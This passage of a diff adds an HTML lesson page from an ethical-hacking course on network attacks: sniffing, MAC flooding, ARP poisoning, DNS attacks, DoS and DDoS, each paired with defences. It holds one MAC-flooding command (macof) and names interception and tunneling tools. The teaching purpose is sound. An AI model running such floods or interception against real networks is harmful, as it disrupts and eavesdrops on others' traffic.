@@ -1,0 +1,1238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EHE Module 06: Network Level Attacks - The Vault</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            min-height: 100vh;
+            background: #0a0508;
+            font-family: 'Georgia', 'Times New Roman', serif;
+            color: #8a6a9a;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background:
+                radial-gradient(ellipse at 20% 30%, rgba(80, 40, 100, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 70%, rgba(60, 20, 80, 0.06) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .scroll-progress {
+            position: fixed;
+            top: 0; left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #9333ea, #a855f7);
+            z-index: 200;
+            transition: width 0.1s linear;
+            width: 0%;
+        }
+
+        .module-header {
+            background: rgba(10, 5, 15, 0.95);
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+            padding: 18px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-left { display: flex; align-items: center; gap: 15px; }
+
+        .back-btn {
+            background: rgba(80, 40, 100, 0.2);
+            border: 1px solid rgba(100, 60, 130, 0.3);
+            color: #9a7aaa;
+            padding: 7px 14px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-family: 'Georgia', serif;
+        }
+
+        .back-btn:hover {
+            background: rgba(100, 60, 130, 0.3);
+            border-color: rgba(147, 51, 234, 0.5);
+            color: #c4a0d8;
+        }
+
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.75rem;
+            color: #6a4a7a;
+        }
+
+        .progress-bar-mini {
+            width: 120px; height: 4px;
+            background: rgba(60, 30, 80, 0.3);
+            border-radius: 2px; overflow: hidden;
+        }
+
+        .progress-bar-mini .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #9333ea, #a855f7);
+            width: 0%; transition: width 0.5s ease;
+        }
+
+        .module-content {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .intro-section {
+            text-align: center;
+            padding: 50px 0 60px;
+        }
+
+        .intro-icon {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3));
+        }
+
+        .intro-title {
+            font-size: 2.4rem;
+            color: #c4a0d8;
+            margin-bottom: 12px;
+            font-weight: 400;
+            letter-spacing: 0.05em;
+        }
+
+        .intro-meta {
+            font-size: 0.75rem;
+            color: #6a4a7a;
+            letter-spacing: 0.25em;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
+        .intro-subtitle {
+            font-size: 1rem;
+            color: #8a6a9a;
+            max-width: 720px;
+            margin: 0 auto;
+            line-height: 1.8;
+        }
+
+        .module-stats {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+
+        .stat-pill {
+            padding: 8px 18px;
+            background: rgba(60, 30, 80, 0.15);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 20px;
+            font-size: 0.75rem;
+            color: #7a5a8a;
+            letter-spacing: 0.1em;
+        }
+
+        .section {
+            margin-bottom: 80px;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .section.visible { opacity: 1; transform: translateY(0); }
+
+        .section-number {
+            font-size: 0.65rem; color: #6a4a7a;
+            letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px;
+        }
+
+        .section-title {
+            font-size: 1.9rem;
+            color: #c4a0d8;
+            margin-bottom: 20px;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.15);
+            padding-bottom: 15px;
+        }
+
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '▸'; position: absolute; left: 0; color: #7a5a8a; }
+
+        .concept-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 18px;
+            margin: 28px 0;
+        }
+
+        .concept-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px;
+            padding: 22px;
+            transition: all 0.3s ease;
+        }
+
+        .concept-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(147, 51, 234, 0.35);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+
+        .concept-tag {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 3px 10px;
+            background: rgba(80, 40, 100, 0.3);
+            border-radius: 12px;
+            font-size: 0.65rem;
+            color: #9333ea;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+        }
+
+        .callout {
+            border-radius: 8px;
+            padding: 20px 24px;
+            margin: 24px 0;
+            display: flex;
+            gap: 16px;
+            align-items: flex-start;
+        }
+
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+
+        .callout-title {
+            font-size: 0.8rem; letter-spacing: 0.15em;
+            text-transform: uppercase; margin-bottom: 6px;
+        }
+
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+
+        .detail-section {
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px;
+            margin: 12px 0;
+            overflow: hidden;
+        }
+
+        .detail-header {
+            padding: 16px 20px;
+            background: rgba(15, 8, 20, 0.6);
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.3s ease;
+            user-select: none;
+        }
+
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-icon { font-size: 1rem; opacity: 0.75; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-header-subtitle { font-size: 0.75rem; color: #6a4a7a; margin-top: 2px; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+
+        .detail-body {
+            display: none;
+            padding: 20px 24px;
+            background: rgba(10, 5, 15, 0.4);
+            border-top: 1px solid rgba(100, 60, 130, 0.1);
+            color: #9a7aaa;
+            font-size: 0.9rem;
+            line-height: 1.7;
+        }
+
+        .detail-body.open { display: block; }
+        .detail-body p { margin-bottom: 12px; }
+        .detail-body ul { list-style: none; padding-left: 20px; }
+        .detail-body li { margin-bottom: 8px; position: relative; padding-left: 18px; }
+        .detail-body li::before { content: '▸'; position: absolute; left: 0; color: #7a5a8a; }
+
+        /* DoS attack table */
+        .attack-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 24px 0;
+            font-size: 0.87rem;
+        }
+
+        .attack-table th {
+            background: rgba(40, 20, 60, 0.5);
+            color: #c4a0d8;
+            padding: 12px 16px;
+            text-align: left;
+            font-weight: normal;
+            letter-spacing: 0.1em;
+            font-size: 0.78rem;
+            text-transform: uppercase;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+        }
+
+        .attack-table td {
+            padding: 12px 16px;
+            color: #9a7aaa;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.08);
+            vertical-align: top;
+        }
+
+        .attack-table tr:hover td { background: rgba(40, 20, 60, 0.25); }
+
+        .attack-table .name-col { color: #c4a0d8; font-size: 0.9rem; }
+
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 0.65rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
+
+        .badge-tcp { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .badge-udp { background: rgba(234, 179, 8, 0.2); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .badge-icmp { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
+        .badge-http { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+
+        .code-block {
+            background: rgba(5, 2, 10, 0.8);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 6px;
+            padding: 16px 20px;
+            margin: 16px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: #b090c0;
+            overflow-x: auto;
+            line-height: 1.6;
+        }
+
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .num { color: #fbbf24; }
+        .code-block .addr { color: #60a5fa; }
+
+        .two-col {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .col-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px;
+            padding: 22px;
+        }
+
+        .col-card h3 {
+            font-size: 1rem; color: #c4a0d8;
+            margin-bottom: 12px;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .col-card ul { list-style: none; padding: 0; }
+
+        .col-card li {
+            font-size: 0.88rem; color: #8a6a9a;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.08);
+            display: flex; align-items: flex-start; gap: 8px;
+        }
+
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+
+        /* Packet diagram */
+        .packet-diagram {
+            background: rgba(5, 2, 10, 0.8);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 8px;
+            padding: 24px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.82rem;
+        }
+
+        .packet-row {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            margin: 6px 0;
+        }
+
+        .packet-field {
+            padding: 8px 12px;
+            border: 1px solid rgba(100, 60, 130, 0.25);
+            text-align: center;
+            font-size: 0.75rem;
+            flex-shrink: 0;
+        }
+
+        .pf-src { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
+        .pf-dst { background: rgba(239, 68, 68, 0.15); color: #f87171; }
+        .pf-flag { background: rgba(147, 51, 234, 0.15); color: #c084fc; }
+        .pf-data { background: rgba(30, 15, 40, 0.5); color: #8a6a9a; flex: 1; }
+        .pf-label { color: #6a4a7a; padding: 8px 12px; }
+
+        .flow-arrow {
+            text-align: center;
+            color: #6a4a7a;
+            font-size: 0.75rem;
+            margin: 4px 0;
+            letter-spacing: 0.1em;
+        }
+
+        .discussion-section {
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.25);
+            border-radius: 10px;
+            padding: 30px;
+            margin: 40px 0;
+        }
+
+        .discussion-title {
+            font-size: 1.1rem; color: #c4a0d8;
+            margin-bottom: 20px;
+            display: flex; align-items: center; gap: 10px;
+        }
+
+        .prompt-list { list-style: none; padding: 0; }
+
+        .prompt-item {
+            padding: 14px 18px;
+            background: rgba(15, 8, 20, 0.5);
+            border: 1px solid rgba(100, 60, 130, 0.12);
+            border-radius: 6px;
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+            color: #9a7aaa;
+            line-height: 1.6;
+            display: flex; gap: 12px;
+        }
+
+        .prompt-num {
+            color: #9333ea;
+            font-size: 0.8rem;
+            font-family: 'Courier New', monospace;
+            flex-shrink: 0;
+            padding-top: 2px;
+        }
+
+        .takeaway-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .takeaway-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px;
+            padding: 20px; text-align: center;
+        }
+
+        .takeaway-icon { font-size: 2rem; margin-bottom: 10px; }
+        .takeaway-title { font-size: 0.85rem; color: #c4a0d8; margin-bottom: 6px; }
+        .takeaway-desc { font-size: 0.78rem; color: #7a5a8a; line-height: 1.5; }
+
+        .completion-section {
+            text-align: center;
+            padding: 60px 40px;
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.3);
+            border-radius: 12px;
+            margin: 60px 0 40px;
+        }
+
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+
+        .completion-text {
+            color: #8a6a9a; font-size: 0.95rem;
+            max-width: 560px; margin: 0 auto 30px; line-height: 1.8;
+        }
+
+        .completion-btn {
+            display: inline-flex;
+            align-items: center; gap: 10px;
+            padding: 14px 36px;
+            background: linear-gradient(135deg, #7c3aed, #9333ea);
+            border: none; border-radius: 8px;
+            color: #f3e8ff; font-size: 1rem;
+            cursor: pointer;
+            font-family: 'Georgia', serif;
+            letter-spacing: 0.05em;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3);
+        }
+
+        .completion-btn:hover {
+            background: linear-gradient(135deg, #6d28d9, #7c3aed);
+            box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45);
+            transform: translateY(-2px);
+        }
+
+        @media (max-width: 768px) {
+            .module-header { padding: 15px 20px; }
+            .module-content { padding: 20px; }
+            .two-col { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">EHE Module 06</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#127760;</div>
+        <h1 class="intro-title">Network Level Attacks and Countermeasures</h1>
+        <div class="intro-meta">EHE &bull; Module 06 &bull; Network Exploitation</div>
+        <p class="intro-subtitle">
+            Network-layer attacks target the protocols and infrastructure that underpin all digital communication.
+            From passive eavesdropping to volumetric denial-of-service campaigns, attackers exploit protocol
+            design weaknesses, implementation flaws, and configuration errors to intercept, manipulate, and
+            disrupt network traffic at scale.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">Sniffing &amp; ARP</div>
+            <div class="stat-pill">7 DoS Variants</div>
+            <div class="stat-pill">DDoS &amp; Botnets</div>
+            <div class="stat-pill">Session Hijacking</div>
+            <div class="stat-pill">~40 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: Packet Sniffing -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128268;</span>
+            Packet Sniffing
+        </h2>
+        <div class="section-body">
+            <p>
+                Packet sniffing is the practice of capturing and analyzing network traffic as it traverses a
+                network segment. In legitimate contexts, network engineers use sniffing tools (Wireshark, tcpdump)
+                for troubleshooting and performance analysis. In adversarial contexts, attackers use sniffing to
+                capture unencrypted credentials, session tokens, and sensitive data transmitted in cleartext.
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#128065; Passive Sniffing</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span>No traffic injection — observe only</li>
+                        <li><span class="li-marker">&#9656;</span>Works on hub-based or shared media networks</li>
+                        <li><span class="li-marker">&#9656;</span>All traffic visible on same collision domain</li>
+                        <li><span class="li-marker">&#9656;</span>Virtually undetectable — generates no traffic</li>
+                        <li><span class="li-marker">&#9656;</span>Less effective on switched networks</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#128640; Active Sniffing</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span>Injects traffic to redirect packets to sniffer</li>
+                        <li><span class="li-marker">&#9656;</span>Required on switched networks (unicast traffic)</li>
+                        <li><span class="li-marker">&#9656;</span>Techniques: ARP spoofing, MAC flooding, DHCP attacks</li>
+                        <li><span class="li-marker">&#9656;</span>Detectable via anomaly monitoring</li>
+                        <li><span class="li-marker">&#9656;</span>Enables full MITM interception</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Promiscuous Mode</div>
+                    <div class="callout-text">
+                        By default, a NIC only passes frames addressed to its own MAC address up to the OS.
+                        In <strong>promiscuous mode</strong>, the NIC accepts and passes all frames it sees on the wire,
+                        regardless of destination MAC. Sniffing tools (Wireshark, tcpdump) enable promiscuous mode
+                        automatically. Detection can be performed by sending packets with bogus destination MACs and
+                        checking which hosts respond — only hosts in promiscuous mode would process them.
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1.1rem; margin:24px 0 16px;">MAC Flooding</h3>
+            <p>
+                MAC flooding exploits the CAM (Content Addressable Memory) table in network switches. Switches
+                maintain a MAC-to-port mapping table with finite capacity. When an attacker floods the switch
+                with frames containing thousands of fake source MAC addresses, the CAM table overflows. Once
+                full, the switch enters <strong>fail-open mode</strong>, broadcasting all traffic to all ports —
+                effectively converting it into a hub and enabling passive sniffing on a switched network.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># macof tool — MAC flooding (included in dsniff suite)</span>
+$ sudo macof -i eth0 -n <span class="num">100000</span>
+
+<span class="comment"># Legitimate monitoring: detect CAM overflow via syslog alerts</span>
+<span class="comment"># Countermeasure: port security — limit MAC addresses per switch port</span>
+Switch(config-if)# switchport port-security maximum <span class="num">2</span>
+Switch(config-if)# switchport port-security violation restrict
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: ARP Poisoning -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9762;</span>
+            ARP Poisoning
+        </h2>
+        <div class="section-body">
+            <p>
+                The Address Resolution Protocol (ARP) maps IP addresses to MAC addresses within a local network
+                segment. ARP is a stateless, trust-based protocol — it accepts replies without verifying whether
+                a request was made, and it has no authentication mechanism. This fundamental design weakness
+                enables ARP cache poisoning attacks.
+            </p>
+            <p>
+                In an ARP poisoning attack, the attacker sends gratuitous ARP replies that map the attacker's
+                MAC address to a victim's IP address (typically the default gateway). Both the victim and the
+                gateway cache these false mappings, causing traffic destined for the gateway to be sent to the
+                attacker instead. The attacker can then forward traffic to the real gateway (enabling transparent
+                interception) or drop it (causing a denial of service).
+            </p>
+
+            <div class="packet-diagram">
+                <div style="color:#6a4a7a; font-size:0.75rem; margin-bottom:12px; letter-spacing:0.1em;">ARP POISONING FLOW</div>
+                <div class="packet-row">
+                    <span class="pf-label">Normal:</span>
+                    <span class="pf-src">Victim IP: 192.168.1.10</span>
+                    <span class="pf-flag"> &#8594; ARP: Who has .1? </span>
+                    <span class="pf-dst">Gateway: MAC aa:bb:cc</span>
+                </div>
+                <div class="flow-arrow">&#x2193; attacker sends gratuitous ARP</div>
+                <div class="packet-row">
+                    <span class="pf-label">Poisoned:</span>
+                    <span class="pf-src">Attacker MAC: de:ad:be:ef</span>
+                    <span class="pf-flag"> &#8594; ".1 is at de:ad:be:ef" </span>
+                    <span class="pf-dst">Victim ARP Cache (corrupted)</span>
+                </div>
+                <div class="flow-arrow">&#x2193; victim traffic now flows through attacker</div>
+                <div class="packet-row">
+                    <span class="pf-label">Result:</span>
+                    <span class="pf-src">Victim</span>
+                    <span class="pf-flag"> &#8594; Attacker (MITM) &#8594; </span>
+                    <span class="pf-dst">Gateway / Internet</span>
+                </div>
+            </div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9762;</span>
+                <div class="callout-content">
+                    <div class="callout-title">MITM via ARP Poisoning</div>
+                    <div class="callout-text">
+                        Once positioned as a Man-in-the-Middle, the attacker can perform SSL stripping (downgrade
+                        HTTPS to HTTP to capture cleartext credentials), session token theft, credential injection,
+                        and traffic modification. Tools: arpspoof (dsniff), Ettercap, Bettercap, Scapy.
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1.1rem; margin:20px 0 14px;">ARP Attack Countermeasures</h3>
+            <div class="section-body">
+                <ul>
+                    <li>Dynamic ARP Inspection (DAI) on managed switches — validates ARP packets against a DHCP snooping binding table</li>
+                    <li>Static ARP entries for critical hosts (gateways, servers) that cannot be overwritten by gratuitous replies</li>
+                    <li>Network monitoring tools (ArpWatch, XArp) that alert on ARP table changes</li>
+                    <li>VPN and end-to-end encryption ensure that even intercepted traffic cannot be read</li>
+                    <li>802.1X port-based authentication restricts which devices can connect to switch ports</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: DNS Attacks -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#127759;</span>
+            DNS Attacks
+        </h2>
+        <div class="section-body">
+            <p>
+                The Domain Name System is the internet's phone book — translating human-readable hostnames into
+                IP addresses. Because DNS underpins virtually all internet communication, attacks against it can
+                silently redirect users to malicious infrastructure at scale without requiring any compromise of
+                the target application or endpoint.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#127966;</div>
+                    <div class="concept-card-title">DNS Spoofing</div>
+                    <div class="concept-card-body">
+                        Attacker intercepts a DNS query in transit (via MITM) and returns a forged response
+                        mapping the requested hostname to a malicious IP. The victim resolves the domain to
+                        the attacker's server. Effective without prior cache compromise.
+                    </div>
+                    <span class="concept-tag">In-Transit</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128190;</div>
+                    <div class="concept-card-title">DNS Cache Poisoning</div>
+                    <div class="concept-card-body">
+                        Corrupts a recursive DNS resolver's cache by injecting forged records before the
+                        legitimate response arrives. The Kaminsky attack (2008) demonstrated a practical
+                        method using birthday-paradox probability to guess transaction IDs within minutes.
+                    </div>
+                    <span class="concept-tag">Cache-Level</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128200;</div>
+                    <div class="concept-card-title">DNS Amplification</div>
+                    <div class="concept-card-body">
+                        Reflection/amplification DDoS using open DNS resolvers. Attacker sends small queries
+                        with spoofed source IP (victim's address) to open resolvers. Resolver returns large
+                        responses (DNSSEC, ANY records) to the victim — amplification ratios up to 50-70x.
+                    </div>
+                    <span class="concept-tag">DDoS Vector</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#9968;</div>
+                    <div class="concept-card-title">DNS Tunneling</div>
+                    <div class="concept-card-body">
+                        Encodes data within DNS queries and responses to exfiltrate data or establish C2
+                        communication channels that bypass firewall rules. DNS is rarely blocked outbound.
+                        Tools: dnscat2, iodine. Detected by monitoring query volume and encoded domain names.
+                    </div>
+                    <span class="concept-tag">Exfiltration</span>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">DNS Countermeasures</div>
+                    <div class="callout-text">
+                        <strong>DNSSEC</strong> (DNS Security Extensions) adds cryptographic signatures to DNS records,
+                        allowing resolvers to verify authenticity. <strong>DNS over HTTPS (DoH)</strong> and
+                        <strong>DNS over TLS (DoT)</strong> encrypt DNS traffic to prevent in-transit manipulation.
+                        Organizations should also disable open recursive resolvers and implement response rate limiting (RRL)
+                        to prevent amplification attacks.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 4: DoS -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128165;</span>
+            Denial of Service (DoS) Attacks
+        </h2>
+        <div class="section-body">
+            <p>
+                Denial of Service attacks aim to make a target system, service, or network unavailable to its
+                intended users. Unlike data breach attacks that seek access, DoS attacks seek disruption —
+                exhausting resources (bandwidth, CPU, memory, connection tables) until the target cannot
+                service legitimate requests.
+            </p>
+
+            <table class="attack-table">
+                <thead>
+                    <tr>
+                        <th>Attack</th>
+                        <th>Protocol</th>
+                        <th>Mechanism</th>
+                        <th>Target Resource</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="name-col">SYN Flood</td>
+                        <td><span class="badge badge-tcp">TCP</span></td>
+                        <td>Sends mass SYN packets without completing 3-way handshake; half-open connections fill the backlog queue</td>
+                        <td>Connection table, CPU</td>
+                    </tr>
+                    <tr>
+                        <td class="name-col">UDP Flood</td>
+                        <td><span class="badge badge-udp">UDP</span></td>
+                        <td>Sends high-volume UDP datagrams to random ports; target exhausts CPU responding with ICMP Port Unreachable</td>
+                        <td>Bandwidth, CPU</td>
+                    </tr>
+                    <tr>
+                        <td class="name-col">ICMP Flood (Ping Flood)</td>
+                        <td><span class="badge badge-icmp">ICMP</span></td>
+                        <td>Overwhelms target with Echo Request packets faster than it can process and reply</td>
+                        <td>Bandwidth, CPU</td>
+                    </tr>
+                    <tr>
+                        <td class="name-col">Smurf Attack</td>
+                        <td><span class="badge badge-icmp">ICMP</span></td>
+                        <td>Sends ICMP Echo Requests to broadcast address with spoofed source = victim; all hosts on subnet reply to victim</td>
+                        <td>Bandwidth (amplified)</td>
+                    </tr>
+                    <tr>
+                        <td class="name-col">Ping of Death</td>
+                        <td><span class="badge badge-icmp">ICMP</span></td>
+                        <td>Sends malformed, oversized ICMP packets (>65,535 bytes) that cause buffer overflow or crash on reassembly</td>
+                        <td>Memory, stability</td>
+                    </tr>
+                    <tr>
+                        <td class="name-col">HTTP Flood</td>
+                        <td><span class="badge badge-http">HTTP</span></td>
+                        <td>Sends legitimate-looking GET/POST requests at scale; bypasses network-layer filters; targets application layer</td>
+                        <td>Web server, CPU</td>
+                    </tr>
+                    <tr>
+                        <td class="name-col">Slowloris</td>
+                        <td><span class="badge badge-http">HTTP</span></td>
+                        <td>Opens many connections and sends partial HTTP headers very slowly; keeps connections open, exhausting thread pool</td>
+                        <td>Connection pool</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">SYN Cookie Countermeasure</div>
+                    <div class="callout-text">
+                        SYN cookies are a server-side defense against SYN floods. Instead of allocating connection
+                        state on receipt of a SYN packet, the server encodes connection parameters into the TCP
+                        Initial Sequence Number (ISN) as a cryptographic cookie. State is only allocated when the
+                        client completes the handshake with a valid ACK, making SYN floods computationally
+                        inexpensive to absorb. Enabled via: <code style="font-family:monospace; color:#c4a0d8;">sysctl net.ipv4.tcp_syncookies=1</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: DDoS -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#127760;</span>
+            Distributed Denial of Service (DDoS)
+        </h2>
+        <div class="section-body">
+            <p>
+                DDoS attacks distribute the attack load across thousands or millions of compromised systems
+                (botnets), making source-based filtering impractical and generating traffic volumes that can
+                overwhelm even enterprise-grade network infrastructure. Modern DDoS attacks frequently exceed
+                1 Tbps — volumes that can saturate upstream ISP links.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#129302;</div>
+                    <div class="concept-card-title">Botnets</div>
+                    <div class="concept-card-body">
+                        Networks of compromised devices (bots/zombies) controlled by a C2 (Command and Control)
+                        server. The botmaster issues flood commands; bots execute them simultaneously. Mirai
+                        botnet (2016) leveraged IoT devices to generate 1.2 Tbps against Dyn DNS, taking
+                        major platforms offline across the US east coast.
+                    </div>
+                    <span class="concept-tag">Infrastructure</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128200;</div>
+                    <div class="concept-card-title">Amplification Attacks</div>
+                    <div class="concept-card-body">
+                        Use intermediary servers (open DNS resolvers, NTP servers, memcached) with spoofed
